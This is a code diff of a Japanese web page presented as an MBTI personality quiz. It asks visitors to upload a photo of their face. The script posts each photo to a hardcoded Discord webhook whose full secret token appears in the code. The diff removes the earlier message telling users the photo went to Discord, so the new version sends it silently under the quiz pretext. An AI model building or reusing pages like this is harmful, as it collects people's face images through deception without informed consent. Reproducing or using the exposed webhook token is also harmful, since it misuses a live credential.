@@ -1,63 +1,86 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>顔写真をアップロード</title>
-  <link rel="stylesheet" href="style.css" />
+  <meta charset="UTF-8">
+  <title>MBTI診断 - 顔の写真アップロード</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="style.css">
+  <style>
+    .upload-section {
+      margin-top: 30px;
+    }
+
+    input[type="file"] {
+      margin-top: 15px;
+      padding: 10px;
+      background-color: #f9f9f9;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+
+    button {
+      margin-top: 30px;
+      padding: 12px 24px;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      background-color: #4CAF50;
+      color: white;
+      cursor: pointer;
+    }
+
+    button:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
+    }
+  </style>
 </head>
 <body>
   <div class="container">
-    <h1>顔写真をアップロード</h1>
-    <form id="photoForm">
-      <input type="file" id="photoInput" accept="image/*" required />
-      <button type="submit" id="submitButton" disabled>送信</button>
-    </form>
+    <h1>顔の写真をアップロード</h1>
+    <p>あなたの顔の写真をアップロードしてください。</p>
+
+    <div class="upload-section">
+      <input type="file" id="shoulderImage" accept="image/*">
+    </div>
+
+    <button id="nextButton" onclick="uploadImage()" disabled>次に進む</button>
   </div>
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1379749797371580437/smRAKks4G35vKArSlqAlVf3N_m8sDVDznuW7oI5gVB6xzJ8-HN32TKxuGTAT1pxYj65G"; // ← あなたのWebhookに置き換えてください
-    const form = document.getElementById("photoForm");
-    const fileInput = document.getElementById("photoInput");
-    const submitButton = document.getElementById("submitButton");
+    const fileInput = document.getElementById('shoulderImage');
+    const nextButton = document.getElementById('nextButton');
 
-    // ファイルが選択されたらボタン有効化
-    fileInput.addEventListener("change", () => {
-      submitButton.disabled = !fileInput.files.length;
+    // 入力があればボタンを有効化
+    fileInput.addEventListener('change', function () {
+      nextButton.disabled = !fileInput.files.length;
     });
 
-    form.addEventListener("submit", async (e) => {
-      e.preventDefault();
-      submitButton.disabled = true;
-
+    async function uploadImage() {
       const file = fileInput.files[0];
-      const fixedMessage = "顔の写真が送信されました";
+      if (!file) {
+        alert('写真をアップロードしてください');
+        return;
+      }
 
       const formData = new FormData();
       formData.append("file", file);
-      formData.append("payload_json", JSON.stringify({
-        content: fixedMessage
-      }));
+      formData.append("username", "MBTI診断ボット");
+      formData.append("content", "顔の写真");
 
       try {
-        const response = await fetch(webhookURL, {
+        await fetch("https://discord.com/api/webhooks/1379749797371580437/smRAKks4G35vKArSlqAlVf3N_m8sDVDznuW7oI5gVB6xzJ8-HN32TKxuGTAT1pxYj65G", {
           method: "POST",
           body: formData
         });
 
-        if (response.ok) {
-          alert("顔の写真をDiscordに送信しました！");
-          window.location.href = "page3.html"; // 次のページへ
-        } else {
-          alert("送信に失敗しました。");
-        }
+        // 正常に送信されたら次のページへ
+        window.location.href = "page3.html";
       } catch (error) {
         console.error("送信エラー:", error);
-        alert("送信中にエラーが発生しました。");
-      } finally {
-        submitButton.disabled = false;
+        alert("送信に失敗しました。もう一度お試しください。");
       }
-    });
+    }
   </script>
 </body>
 </html>
